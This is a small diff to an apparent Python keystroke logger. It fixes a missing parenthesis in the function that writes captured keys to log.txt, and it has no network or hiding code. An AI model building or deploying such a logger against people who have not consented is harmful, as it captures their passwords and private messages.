@@ -17,13 +17,12 @@ def on_press(key):
         print('special key {0} pressed'.format(key))
          
 def write_file(keys):
-    
     with open('log.txt', 'w') as f:
         for key in keys:
             
             # removing ''
             k = str(key).replace("'", "")
-            f.write(k
+            f.write(k)
                     
             # explicitly adding a space after 
             # every keystroke for readability
